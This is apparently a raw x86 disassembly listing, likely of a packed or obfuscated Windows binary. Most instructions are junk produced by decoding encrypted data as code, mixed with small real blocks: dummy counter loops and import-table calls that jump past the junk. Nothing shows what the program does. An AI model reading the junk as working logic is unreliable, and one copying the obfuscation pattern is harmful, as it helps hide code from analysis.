  401865:	(bad)  
  401866:	lahf   
  401867:	in     al,0x9e
  401869:	fdiv   st(3),st
  40186b:	jg     0x40186d
  40186d:	cs pop es
  40186f:	pop    ebp
  401870:	fsub   DWORD PTR [edi]
  401872:	into   
  401873:	adc    DWORD PTR [ebx+0x72],0x26
  401877:	and    DWORD PTR [esi],esp
  401879:	or     BYTE PTR [ebp+0x107cb305],bh
  40187f:	mov    cl,0xb3
  401881:	sbb    dl,0x4d
  401884:	in     al,0xc1
  401886:	xchg   dh,bl
  401888:	sub    BYTE PTR [eax-0x17db7978],ah
  40188e:	pop    esi
  40188f:	add    ebx,0xec822ac4
  401895:	arpl   WORD PTR [ebx-0x12a005e7],ax
  40189b:	pop    ds
  40189c:	out    0x88,al
  40189e:	sub    BYTE PTR [esi-0x5a2a54a0],cl
  4018a4:	aaa    
  4018a5:	dec    ecx
  4018a6:	mov    BYTE PTR [edx],al
  4018a8:	pop    ss
  4018a9:	and    ah,dh
  4018ab:	cmp    ah,0x56
  4018ae:	pop    esi
  4018af:	aad    0xda
  4018b1:	test   DWORD PTR [edi+0x15],esi
  4018b4:	xchg   ebx,eax
  4018b5:	jne    0x4018fd
  4018b7:	push   ebx
  4018b8:	sbb    eax,0x52257731
  4018bd:	daa    
  4018be:	and    DWORD PTR [ebp-0xe],ebp
  4018c1:	nop
  4018c2:	push   0xe6a5dedc
  4018c7:	push   eax
  4018c8:	pop    esp
  4018c9:	ins    BYTE PTR es:[edi],dx
  4018ca:	pop    esi
  4018cb:	mov    ds:0xd2ecbd23,al
  4018d0:	std    
  4018d1:	cmovnp edi,ebx
  4018d4:	inc    edi
  4018d5:	push   ecx
  4018d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018d7:	pop    ss
  4018d8:	pop    ebx
  4018d9:	push   esi
  4018da:	punpckhwd mm0,mm4
  4018dd:	jnp    0x401875
  4018df:	push   eax
  4018e0:	pop    esi
  4018e1:	popf   
  4018e2:	call   0xf40faf6c
  4018e7:	leave  
  4018e8:	enter  0x783,0x4
  4018ec:	and    al,0x11
  4018ee:	pop    esi
  4018ef:	in     eax,0xc5
  4018f1:	rcr    BYTE PTR [esi+ebp*2+0x58b354a9],1
  4018f8:	xor    edi,eax
  4018fa:	push   0xe563ea23
  4018ff:	mov    DWORD PTR ds:0xf654f512,ebp
  401905:	sbb    eax,0x5d62248a
  40190a:	test   al,0x33
  40190c:	arpl   WORD PTR [ebx-0x15b4a1d],ax
  401912:	pop    eax
  401913:	push   ebp
  401914:	aas    
  401915:	mov    DWORD PTR [ebx+0x3ba304fc],ebx
  40191b:	ffree  st(1)
  40191d:	call   0x219c:0xd87fd36d
  401924:	mov    al,ds:0xef21b190
  401929:	outs   dx,DWORD PTR ds:[esi]
  40192a:	jmp    0x40195b
  40192c:	mov    cl,0x85
  40192e:	jg     0x40192a
  401930:	iret   
  401931:	in     eax,0x9e
  401933:	repz xchg ebx,eax
  401935:	fild   WORD PTR [edx+0x24]
  401938:	fadd   DWORD PTR [ebx]
  40193a:	sbb    esp,ebx
  40193c:	jnp    0x401992
  40193e:	mov    al,ds:0xd387f0a0
  401943:	jnp    0x401999
  401945:	and    al,0x94
  401947:	adc    edx,DWORD PTR [ebx+ebx*1+0x72]
  40194b:	stc    
  40194c:	pop    ebx
  40194d:	inc    esp
  40194e:	inc    ecx
  401950:	int3   
  401951:	jmp    0x4672:0x9d3139de
  401958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401959:	ss out dx,al
  40195b:	mov    ds:0x286c2cf8,eax
  401960:	sub    al,0x50
  401962:	into   
  401963:	fisubr DWORD PTR ds:0xa81ee665
  401969:	add    al,0x9b
  40196b:	sbb    al,0x98
  40196d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40196e:	xchg   DWORD PTR [ecx-0x17],edx
  401971:	push   es
  401972:	in     eax,dx
  401973:	fldcw  WORD PTR [ebp+0x69]
  401976:	inc    edi
  401977:	push   ds
  401978:	(bad)  
  401979:	mov    ebp,0xc1b67e53
  40197e:	es out dx,al
  401980:	mov    ebx,0x89c70364
  401985:	add    DWORD PTR [ebx],ebx
  401987:	leave  
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	and    esp,DWORD PTR [edi+0x1823010]
  4019a9:	js     0x401a23
  4019ab:	(bad)  
  4019ac:	jle    0x401a26
  4019ae:	js     0x40193f
  4019b0:	int3   
  4019b1:	pop    es
  4019b2:	inc    eax
  4019b3:	push   ebx
  4019b4:	es pop esi
  4019b6:	lods   al,BYTE PTR cs:[esi]
  4019b8:	mov    esp,0xdecb989f
  4019bd:	fcom   st(1)
  4019bf:	ja     0x4019a5
  4019c1:	cs out 0xf6,al
  4019c4:	test   DWORD PTR [edx+ebx*2],edi
  4019c7:	ret    0x732f
  4019ca:	shl    DWORD PTR [eax+0x31],1
  4019cd:	aad    0x9a
  4019cf:	es sbb al,0x4b
  4019d2:	cld    
  4019d3:	icebp  
  4019d4:	or     BYTE PTR [ecx-0x7ee7551b],bh
  4019da:	dec    esi
  4019db:	or     ch,ah
  4019dd:	daa    
  4019de:	bound  ebp,QWORD PTR [ecx+0x6d27d7dc]
  4019e4:	scas   al,BYTE PTR es:[edi]
  4019e5:	and    DWORD PTR [ebp+eax*2-0x4add0f74],edx
  4019ec:	lock and DWORD PTR [ebx+0x5f28cb75],0xffffff9a
  4019f4:	and    eax,0xa3cec554
  4019f9:	ficom  WORD PTR [edx]
  4019fb:	out    0xa3,eax
  4019fd:	dec    edx
  4019fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019ff:	mov    dh,0x60
  401a01:	enter  0x5392,0x48
  401a05:	(bad)  
  401a06:	mov    al,ds:0xe1364a0a
  401a0b:	outs   dx,BYTE PTR ds:[esi]
  401a0c:	idiv   edi
  401a0e:	mov    ch,0xb6
  401a10:	popa   
  401a11:	pop    edx
  401a12:	imul   ebx,DWORD PTR [ebx-0x63],0x3
  401a16:	pop    ds
  401a17:	ja     0x401a3d
  401a19:	push   ds
  401a1a:	scas   ax,WORD PTR es:[edi]
  401a1c:	xor    al,BYTE PTR [ebp-0x39]
  401a1f:	dec    eax
  401a20:	test   al,0x95
  401a22:	xchg   esp,eax
  401a23:	push   eax
  401a24:	(bad)
  401a27:	mov    WORD PTR [edi+0x3c],gs
  401a2a:	inc    ebx
  401a2b:	mov    cl,0x5
  401a2d:	ror    DWORD PTR ds:0xcb515576,cl
  401a33:	bound  esp,QWORD PTR [esi]
  401a35:	out    dx,eax
  401a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a37:	or     BYTE PTR [eax],ah
  401a39:	mov    ds:0xd5f88e97,eax
  401a3e:	aam    0x6c
  401a40:	dec    eax
  401a41:	xchg   ebp,eax
  401a42:	xor    BYTE PTR [edx-0x7b6349c7],cl
  401a48:	shl    DWORD PTR [ebp+0xf],1
  401a4b:	aas    
  401a4c:	mov    edx,0x7ce408a3
  401a51:	sbb    edi,DWORD PTR ds:0x3f8e21e2
  401a57:	mov    ebp,0x44f091a1
  401a5c:	mov    al,BYTE PTR [esi+eiz*8-0x6c]
  401a60:	adc    BYTE PTR [ebx-0x50],cl
  401a63:	xchg   ecx,eax
  401a64:	adc    DWORD PTR [esi-0x3609a1c],0xffffff82
  401a6b:	sbb    bh,cl
  401a6d:	bnd es jbe 0x401a42
  401a71:	jmp    0xb1d8:0xf8ac08e6
  401a78:	out    dx,eax
  401a79:	mov    eax,ds:0xb8a023e7
  401a7e:	add    BYTE PTR [ecx-0x5c208ad8],dl
  401a84:	push   eax
  401a85:	add    esi,esi
  401a87:	gs enter 0x8da9,0x43
  401a8c:	inc    ebx
  401a8d:	cmp    esi,DWORD PTR [ebp+0x7f30167d]
  401a93:	stos   DWORD PTR es:[edi],eax
  401a94:	or     eax,0xb7321984
  401a99:	or     eax,0xbd2f4932
  401a9e:	or     BYTE PTR [edi],bh
  401aa0:	inc    ebp
  401aa1:	pop    esp
  401aa2:	mov    eax,ds:0xdbcae883
  401aa7:	pop    esi
  401aa8:	mov    ds:0x70eb6e78,eax
  401aad:	mov    eax,0xe84f5c26
  401ab2:	bound  ebp,QWORD PTR [ebx+0x4b]
  401ab5:	lea    edx,[edx]
  401ab7:	addr16 lahf 
  401ab9:	pusha  
  401aba:	retf   0x32c2
  401abd:	push   ebp
  401abe:	mov    BYTE PTR [esi+0x2e],0x7b
  401ac2:	js     0x401acd
  401ac4:	inc    ebp
  401ac5:	inc    edx
  401ac6:	sub    eax,0x5ae5cc1c
  401acb:	dec    eax
  401acc:	add    DWORD PTR [ebx],edi
  401ace:	fisub  DWORD PTR [esi-0x7c79a62d]
  401ad4:	test   al,0x97
  401ad6:	test   DWORD PTR [edi-0xa9bf683],0x56927dd8
  401ae0:	mov    al,0xd6
  401ae2:	xor    al,0xfe
  401ae4:	adc    DWORD PTR [edx-0x44],ecx
  401ae7:	mov    edi,0x1df4b6ec
  401aec:	stos   BYTE PTR es:[edi],al
  401aed:	aad    0x7
  401aef:	or     al,0x34
  401af1:	test   DWORD PTR [ebx],esp
  401af3:	pop    ebx
  401af4:	adc    cl,0xbe
  401af7:	fcmove st,st(3)
  401af9:	cmp    eax,0x3f191b7f
  401afe:	push   eax
  401aff:	imul   ebx,DWORD PTR ds:0x7b953def,0xbf73d909
  401b09:	les    esi,FWORD PTR [ebx+0x74]
  401b0c:	jno    0x401b00
  401b0e:	fcom   QWORD PTR ss:[edx]
  401b11:	add    DWORD PTR [edi-0x4f7b26a4],edx
  401b17:	int    0xe9
  401b19:	arpl   WORD PTR [edx+0x6e14794c],sp
  401b1f:	cmp    eax,0xc052a6eb
  401b24:	inc    eax
  401b25:	push   esi
  401b26:	sub    bl,dh
  401b28:	std    
  401b29:	adc    BYTE PTR [esi+0x7db52974],bl
  401b2f:	ficomp WORD PTR [ebx-0x3758e3d5]
  401b35:	je     0x401b85
  401b37:	dec    ecx
  401b38:	sti    
  401b39:	pushfw 
  401b3b:	call   0xd54c:0x56a72448
  401b42:	push   esi
  401b43:	or     al,BYTE PTR [esp+eax*2-0x71c0d22f]
  401b4a:	push   edi
  401b4b:	cld    
  401b4c:	push   0x4c
  401b4e:	loop   0x401b8c
  401b50:	repnz stos DWORD PTR es:[edi],eax
  401b52:	xchg   edx,eax
  401b53:	add    bh,BYTE PTR [esi]
  401b55:	fstp   DWORD PTR [ebx+0x1f]
  401b58:	call   DWORD PTR [ebp-0x2be087c1]
  401b5e:	mov    al,0xeb
  401b60:	push   0x51cdeb02
  401b65:	cmp    eax,0xd425835f
  401b6a:	leave  
  401b6b:	push   esi
  401b6c:	adc    al,0xcd
  401b6e:	push   ebp
  401b6f:	dec    ebp
  401b70:	jmp    0xe6fa:0xc7bf
  401b76:	mov    ch,0x5c
  401b78:	ins    DWORD PTR es:[edi],dx
  401b79:	scas   eax,DWORD PTR es:[edi]
  401b7a:	xor    DWORD PTR [eax],eax
  401b7c:	ror    dh,0xf5
  401b7f:	ss jmp 0x401ba8
  401b82:	in     eax,dx
  401b83:	lea    esp,[esi]
  401b85:	in     eax,dx
  401b86:	clc    
  401b87:	pop    ss
  401b88:	mov    ah,ch
  401b8a:	test   al,0xee
  401b8c:	cli    
  401b8d:	inc    ecx
  401b8e:	and    ah,BYTE PTR [edx-0x20]
  401b91:	sub    ecx,DWORD PTR [ebx+0x7c]
  401b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b95:	out    dx,al
  401b96:	mov    DWORD PTR [edi],esp
  401b98:	cwde   
  401b99:	cmp    ebx,ebp
  401b9b:	aaa    
  401b9c:	mov    eax,0xdeed3b78
  401ba1:	inc    ebp
  401ba2:	dec    ecx
  401ba3:	push   ds
  401ba4:	ins    DWORD PTR es:[edi],dx
  401ba5:	retf   
  401ba6:	lock mov dh,0x81
  401ba9:	xor    eax,0xeb6e9d8c
  401bae:	mov    dh,0xaf
  401bb0:	test   DWORD PTR [eax+0x4ba323b2],eax
  401bb6:	sbb    esi,eax
  401bb8:	dec    esp
  401bb9:	or     eax,0x9ceb4f29
  401bbe:	test   BYTE PTR [ecx-0x611edb5a],ch
  401bc4:	mov    ds:0x3bec48b7,eax
  401bc9:	and    ebx,0x49
  401bcc:	sbb    esi,edx
  401bce:	int    0x5d
  401bd0:	loopne 0x401bed
  401bd2:	dec    edx
  401bd3:	iret   
  401bd4:	inc    ebx
  401bd5:	mov    esp,DWORD PTR [ecx-0x7c]
  401bd8:	ja     0x401bbe
  401bda:	nop
  401bdb:	inc    ebp
  401bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bdd:	pusha  
  401bde:	sbb    BYTE PTR [eax-0x39],al
  401be1:	xlat   BYTE PTR ds:[ebx]
  401be2:	rol    edx,0x8a
  401be5:	push   es
  401be6:	sti    
  401be7:	das    
  401be8:	sbb    al,BYTE PTR [esi]
  401bea:	retf   
  401beb:	mov    al,ds:0x776dc776
  401bf0:	add    ebp,DWORD PTR [ebx+0x49febf38]
  401bf6:	cmp    eax,0xe3945ee2
  401bfb:	adc    eax,0x4e214506
  401c00:	push   ss
  401c01:	enter  0xc871,0x1f
  401c05:	cmp    BYTE PTR [edi+0xc9ffc63],0x6a
  401c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c0d:	add    bh,BYTE PTR [edi-0x6bba4b72]
  401c13:	mov    al,ds:0x94dac061
  401c18:	pavgw  mm7,QWORD PTR [ecx+0x7386378b]
  401c1f:	or     cl,bh
  401c21:	inc    edi
  401c22:	jne    0x401bbc
  401c24:	dec    ebp
  401c25:	sbb    BYTE PTR [ebx],dl
  401c27:	shl    DWORD PTR [ecx-0x46bc0bc3],cl
  401c2d:	rcr    DWORD PTR [edx+0x0],0x9a
  401c31:	mov    DWORD PTR [ebp-0x20],eax
  401c34:	and    DWORD PTR ds:0x42a83d,0x0
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42a83d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a83d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a83d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a83d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa2e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a83d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a83d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a83d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a761,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a775
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a769
  401cbe:	and    eax,DWORD PTR ds:0x42a7b9
  401cc4:	mov    ds:0x42a769,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a7f9,0x42a801
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a77d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0xbeba
  401d05:	sbb    al,0x85
  401d07:	dec    esp
  401d08:	add    BYTE PTR [esi],al
  401d0a:	js     0x401d84
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401cf1
  401d11:	add    DWORD PTR [eax-0x7fccb199],esp
  401d17:	jl     0x401d8c
  401d19:	imul   eax,DWORD PTR [edx+0x6328a830],0x3ca727fe
  401d23:	fnstenv [edi]
  401d25:	mul    DWORD PTR ds:0x218658aa
  401d2b:	jmp    0x401da3
  401d2d:	sub    ebx,eax
  401d2f:	add    DWORD PTR [edx],edx
  401d31:	pop    es
  401d32:	mov    cl,0xa0
  401d34:	enter  0x52df,0x74
  401d38:	sbb    ecx,DWORD PTR [edi]
  401d3a:	xchg   edx,eax
  401d3b:	(bad)
  401d3f:	sub    BYTE PTR [esi-0x3d],0x94
  401d43:	sar    DWORD PTR [ecx],0x9a
  401d46:	jecxz  0x401d03
  401d48:	aad    0x5e
  401d4a:	and    eax,0x580160d7
  401d4f:	pop    edx
  401d50:	inc    eax
  401d51:	jecxz  0x401d69
  401d53:	jno    0x401db1
  401d55:	mov    bl,0x8f
  401d57:	sub    BYTE PTR [ecx-0x2a],dh
  401d5a:	into   
  401d5b:	inc    esi
  401d5c:	lods   al,BYTE PTR ds:[esi]
  401d5d:	cld    
  401d5e:	aas    
  401d5f:	cmp    al,0x93
  401d61:	scas   eax,DWORD PTR es:[edi]
  401d62:	push   edx
  401d63:	cmp    eax,0x31c063f3
  401d68:	fwait
  401d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d6a:	or     BYTE PTR [edx-0x56],bh
  401d6d:	icebp  
  401d6e:	mov    ds:0xeeaba544,eax
  401d73:	out    0x35,eax
  401d75:	mov    al,ds:0x48e8d961
  401d7a:	hlt    
  401d7b:	push   ebp
  401d7c:	lds    ecx,FWORD PTR [esi-0x4d]
  401d7f:	mov    bl,al
  401d81:	push   esp
  401d82:	mov    dh,0xa8
  401d84:	inc    ebp
  401d85:	push   0xaffe2773
  401d8a:	repz fcomp st(5)
  401d8d:	loopne 0x401db9
  401d8f:	jmp    0x401d20
  401d91:	mov    ebp,0xc78d641e
  401d96:	cmp    esp,DWORD PTR [esi+0x45356280]
  401d9c:	pop    ds
  401d9d:	mov    ds:0x1354436c,eax
  401da2:	ret    0xc1b9
  401da5:	les    esi,FWORD PTR [edi-0x3d]
  401da8:	es xchg ecx,eax
  401daa:	cmp    ecx,DWORD PTR [esi-0x6b275af4]
  401db0:	xor    esi,eax
  401db2:	mov    al,ds:0x485b76c1
  401db7:	adc    ax,0x1309
  401dbb:	sbb    bh,ah
  401dbd:	push   ds
  401dbe:	inc    ebx
  401dbf:	sub    DWORD PTR [eax+ecx*8],ebp
  401dc2:	mov    edx,0xfafa5380
  401dc7:	shr    BYTE PTR [ebx],0xa3
  401dca:	repnz lods al,BYTE PTR ds:[esi]
  401dcc:	push   ecx
  401dcd:	stos   DWORD PTR es:[edi],eax
  401dce:	mov    ah,0x81
  401dd0:	dec    esp
  401dd1:	mov    ds:0x67cbcfe9,al
  401dd6:	sbb    eax,0x272435c0
  401ddb:	call   0xbabe:0x86ddb5e
  401de2:	xchg   edx,eax
  401de3:	sbb    edx,ecx
  401de5:	mov    ds:0x9eb5644,al
  401dea:	scas   eax,DWORD PTR es:[edi]
  401deb:	bound  esp,QWORD PTR [ebx+0x4a]
  401dee:	or     ah,BYTE PTR [edi-0x55b6dc77]
  401df4:	and    DWORD PTR [ebp-0x53c234a7],edi
  401dfa:	clc    
  401dfb:	jle    0x401dc2
  401dfd:	adc    ecx,eax
  401dff:	mov    esi,DWORD PTR [esi+0x56]
  401e02:	loopne 0x401e64
  401e04:	ss xchg esp,eax
  401e06:	(bad)  
  401e07:	inc    DWORD PTR [edi]
  401e09:	out    dx,al
  401e0a:	cmp    DWORD PTR [ebx-0x48],eax
  401e0d:	cdq    
  401e0e:	jbe    0x401db4
  401e10:	cmc    
  401e11:	stc    
  401e12:	lods   al,BYTE PTR ds:[esi]
  401e13:	hlt    
  401e14:	out    dx,eax
  401e15:	ret    
  401e16:	lods   al,BYTE PTR ds:[esi]
  401e17:	int3   
  401e18:	rol    BYTE PTR [esi-0x5c520028],cl
  401e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e1f:	mov    bh,0x95
  401e21:	fisub  WORD PTR [edx+0x42]
  401e24:	fisubr DWORD PTR [edx+0x3b]
  401e27:	mov    WORD PTR [ebx],?
  401e29:	ret    
  401e2a:	shl    edi,0xe
  401e2d:	scas   eax,DWORD PTR es:[edi]
  401e2e:	adc    eax,0x38b528a8
  401e33:	mov    DWORD PTR [eax-0x3b],esp
  401e36:	jno    0x401e1e
  401e38:	add    al,0xf2
  401e3a:	call   0xb2318f49
  401e3f:	stos   DWORD PTR es:[edi],eax
  401e40:	adc    BYTE PTR [ecx-0x33343ed2],dh
  401e46:	add    dh,BYTE PTR ds:0xf679045b
  401e4c:	pop    edx
  401e4d:	(bad)
  401e50:	enter  0x4191,0x60
  401e54:	pusha  
  401e55:	jp     0x401e80
  401e57:	jge    0x401e69
  401e59:	push   ebx
  401e5a:	(bad)  
  401e5c:	mov    ebx,esi
  401e5e:	loopne 0x401ec2
  401e60:	pop    ecx
  401e61:	push   es
  401e62:	cwde   
  401e63:	loop   0x401e60
  401e65:	xchg   BYTE PTR [ebx+0x17],dl
  401e68:	dec    edx
  401e69:	aam    0xbe
  401e6b:	mov    esi,DWORD PTR [ebx]
  401e6d:	into   
  401e6e:	in     al,dx
  401e6f:	jae    0x401e54
  401e71:	jnp    0x401e89
  401e73:	scas   eax,DWORD PTR es:[edi]
  401e74:	aas    
  401e75:	call   0xa4e1dd8b
  401e7a:	arpl   WORD PTR cs:0x1fcb6bcf,di
  401e81:	push   ecx
  401e82:	ret    
  401e83:	aad    0x9f
  401e85:	xchg   esi,eax
  401e86:	ror    DWORD PTR [edx-0x484a0af1],1
  401e8c:	fisubr DWORD PTR [edi+ebx*8]
  401e8f:	ins    BYTE PTR es:[edi],dx
  401e90:	mov    DWORD PTR [edi-0x72],edi
  401e93:	loopne 0x401e26
  401e95:	inc    esp
  401e96:	js     0x401e58
  401e98:	sahf   
  401e99:	dec    edx
  401e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e9b:	call   0xe718:0xe15b6a07
  401ea2:	ja     0x401ec9
  401ea4:	cmc    
  401ea5:	and    al,0x48
  401ea7:	outs   dx,DWORD PTR ds:[esi]
  401ea8:	pop    es
  401ea9:	mov    esi,0xa2897637
  401eae:	outs   dx,DWORD PTR ds:[esi]
  401eaf:	or     ecx,DWORD PTR [ecx]
  401eb1:	out    0x4f,eax
  401eb3:	xor    BYTE PTR [esi-0x7d],dl
  401eb6:	add    BYTE PTR ds:0x7050441b,ah
  401ebc:	mov    dl,0xd6
  401ebe:	jbe    0x401ebd
  401ec0:	fst    DWORD PTR [esi+eax*4]
  401ec3:	test   al,0xb8
  401ec5:	pop    ecx
  401ec6:	lds    ebp,FWORD PTR [eax]
  401ec8:	push   ecx
  401ec9:	pop    es
  401eca:	das    
  401ecb:	ins    DWORD PTR es:[edi],dx
  401ecc:	xor    ax,0xccb
  401ed0:	sbb    al,0x36
  401ed2:	fs cdq 
  401ed4:	ret    0x142c
  401ed7:	arpl   WORD PTR [edx+0x66f854aa],di
  401edd:	adc    dl,ah
  401edf:	ret    
  401ee0:	xchg   bl,dl
  401ee2:	jo     0x401f0c
  401ee4:	mov    ebp,0xe54c7365
  401ee9:	pop    edx
  401eea:	mov    bl,0x99
  401eec:	push   esp
  401eed:	xchg   esi,eax
  401eee:	lock cdq 
  401ef0:	pop    es
  401ef1:	jns    0x401eb8
  401ef3:	push   esp
  401ef4:	and    eax,0xea82544
  401ef9:	daa    
  401efa:	pop    ebx
  401efb:	lahf   
  401efc:	out    dx,al
  401efd:	sar    DWORD PTR [edx+0x14cf4de0],1
  401f03:	(bad)  
  401f04:	shl    eax,1
  401f06:	retf   
  401f07:	imul   eax,DWORD PTR [eax],0xffffff8b
  401f0a:	lods   eax,DWORD PTR ds:[esi]
  401f0b:	or     eax,0xf965ae21
  401f10:	xor    ebp,DWORD PTR [edi-0x1bb641d5]
  401f16:	cmp    BYTE PTR [ebx+ebx*8-0x64],cl
  401f1a:	nop
  401f1b:	ds cli 
  401f1d:	push   ds
  401f1e:	lods   al,BYTE PTR ds:[esi]
  401f1f:	(bad)  
  401f20:	xor    ch,BYTE PTR [esi]
  401f22:	pop    eax
  401f23:	mov    dh,0x31
  401f25:	xor    BYTE PTR [edi+0x1e],dl
  401f28:	repz cld 
  401f2a:	jno    0x401f00
  401f2c:	add    DWORD PTR [edi-0x67671cc6],0x5e
  401f33:	idiv   BYTE PTR [esi]
  401f35:	xor    DWORD PTR [esi+edx*2+0x68],0x6b
  401f3a:	inc    eax
  401f3b:	adc    BYTE PTR [ecx+0x30],0xe0
  401f3f:	adc    bl,BYTE PTR [edi]
  401f41:	inc    ebp
  401f42:	stc    
  401f43:	jmp    0x401f76
  401f45:	pop    edx
  401f46:	jb     0x401f7d
  401f48:	jnp    0x401efe
  401f4a:	pop    edi
  401f4b:	push   esp
  401f4c:	sbb    BYTE PTR [edi-0x18],bl
  401f4f:	sbb    bh,BYTE PTR ss:[ebp+0x19dca163]
  401f56:	data16 test BYTE PTR [eax+ebx*1-0x5ad9d1ca],dl
  401f5e:	adc    eax,0xf59cd93f
  401f63:	call   0x48:0x771cad1c
  401f6a:	pushw  ds
  401f6c:	imul   BYTE PTR ds:0xa48ade4c
  401f72:	add    bh,bl
  401f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f75:	ret    
  401f76:	mov    ebp,ecx
  401f78:	aaa    
  401f79:	xchg   ebx,eax
  401f7a:	rcr    BYTE PTR [eax],1
  401f7c:	or     DWORD PTR [edx],esi
  401f7e:	imul   ebp,DWORD PTR [eax+0x8ad870],0xc14dd466
  401f88:	rcr    DWORD PTR [esi-0x1d666e21],cl
  401f8e:	dec    cl
  401f90:	clc    
  401f91:	push   edi
  401f92:	add    ecx,DWORD PTR [eax]
  401f94:	xor    eax,eax
  401f96:	add    eax,DWORD PTR ds:0x42a839
  401f9c:	and    eax,DWORD PTR ds:0x42a889
  401fa2:	mov    ds:0x42a839,eax
  401fa7:	mov    DWORD PTR [ebp-0x18],ecx
  401faa:	add    DWORD PTR ds:0x42a7f1,0x598
  401fb4:	mov    eax,DWORD PTR [ebp+0x8]
  401fb7:	and    DWORD PTR ds:0x42a759,0x0
  401fc1:	jmp    0x401fd3
  401fc6:	mov    ecx,DWORD PTR ds:0x42a759
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a759,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a759,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a759,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    edx,ecx
  402018:	mov    ebx,0x486428a
  40201d:	js     0x402097
  40201f:	(bad)  
  402020:	jle    0x40209a
  402022:	js     0x402082
  402024:	xchg   ebp,eax
  402025:	pop    edx
  402026:	(bad)  
  402027:	jecxz  0x401fdb
  402029:	outs   dx,DWORD PTR ds:[esi]
  40202a:	jp     0x402066
  40202c:	ins    BYTE PTR es:[edi],dx
  40202d:	in     al,0xc9
  40202f:	and    eax,0xcb66e447
  402034:	enter  0xd5c3,0x1
  402038:	cmp    DWORD PTR [ebx],eax
  40203a:	add    dh,bl
  40203c:	sub    esi,DWORD PTR [esi+eiz*1-0x7d]
  402040:	out    0x67,al
  402042:	setge  BYTE PTR [ebx+0xe]
  402046:	int    0xcd
  402048:	test   ch,al
  40204a:	xor    BYTE PTR [esi+ebp*4+0x2a],0xed
  40204f:	jb     0x402011
  402051:	and    cl,BYTE PTR [esi+0x30a4a937]
  402057:	stc    
  402058:	lods   eax,DWORD PTR ds:[esi]
  402059:	inc    esp
  40205a:	int3   
  40205b:	adc    ecx,esi
  40205d:	sbb    al,0xf1
  40205f:	add    BYTE PTR [eax],dh
  402061:	cli    
  402062:	jmp    0xb9a1d11b
  402067:	fist   DWORD PTR [edi+0x6aece535]
  40206d:	sahf   
  40206e:	cmp    eax,DWORD PTR [eax+ebp*1+0x16e6381f]
  402075:	fmul   st,st(6)
  402077:	pusha  
  402078:	es inc edx
  40207a:	je     0x40206e
  40207c:	sbb    al,0xdb
  40207e:	inc    edx
  40207f:	fstp   QWORD PTR [ebx]
  402081:	out    dx,al
  402082:	adc    eax,0x8ab52b63
  402087:	dec    edx
  402088:	outs   dx,DWORD PTR ds:[esi]
  402089:	outs   dx,DWORD PTR ds:[esi]
  40208a:	out    dx,eax
  40208b:	sub    BYTE PTR [eax+0x50],0xfb
  40208f:	add    DWORD PTR [ecx],esp
  402091:	ins    BYTE PTR es:[edi],dx
  402092:	fmul   DWORD PTR [ecx+0x6b327dc3]
  402098:	jmp    0x3455:0xcce6e215
  40209f:	mov    ebp,0x40870ee5
  4020a4:	psllw  mm7,QWORD PTR [ebx+0x53]
  4020a8:	pushf  
  4020a9:	fld    TBYTE PTR [ebp-0x16]
